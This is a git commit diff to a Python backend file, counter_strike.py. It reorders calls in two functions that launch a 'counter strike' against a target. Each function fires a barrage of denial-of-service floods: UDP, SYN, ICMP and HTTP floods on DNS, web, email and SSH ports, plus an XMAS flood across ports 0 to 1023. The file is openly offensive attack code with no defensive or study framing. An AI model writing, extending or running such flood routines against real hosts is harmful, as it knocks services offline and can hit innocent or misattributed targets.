f6e7e41a4d252c855c840fdb53952c1ac40b2833
scottwang <hanqing.a350@gmail.com>
2025-04-21 16:30:13 -0700

    counter attack file update

--- backend/app/services/counter_strike.py
+++ backend/app/services/counter_strike.py
@@ -1,6 +1,5 @@
 import counter_strike_helper
 def full_scale_counter_strike(target):
-    counter_strike_helper.attack_http_flood(target,80,10000)
     counter_strike_helper.attack_UDP("UDP-Mix",target,53,300) # DNS
     counter_strike_helper.attack_UDP("UDP-Mix", target, 443, 300) # QUIC
     counter_strike_helper.synflood(target,80,200) # HTTP
@@ -12,16 +11,17 @@ def full_scale_counter_strike(target):
     counter_strike_helper.synflood(target, 993, 200) # Email
     counter_strike_helper.synflood(target, 22, 200) # SSH
     counter_strike_helper.icmpflood(target,200) # ICMP
+    counter_strike_helper.attack_http_flood(target,80,10000) # http flood
     for port in range(0,1024): # xmas flood
         counter_strike_helper.xmasflood(target,port,50)
 
 def fast_counter_strike(target):
-    counter_strike_helper.attack_http_flood(target, 80, 3000)
     counter_strike_helper.attack_UDP("UDP-Mix", target, 53, 60)  # DNS
     counter_strike_helper.synflood(target, 80, 100)  # HTTP
     counter_strike_helper.synflood(target, 443, 100)  # HTTPS
     counter_strike_helper.synflood(target, 25, 100)  # Email
     counter_strike_helper.synflood(target, 587, 100)  # Email
     counter_strike_helper.icmpflood(target, 80) # ICMP
+    counter_strike_helper.attack_http_flood(target, 80, 3000) # http flood
 
 
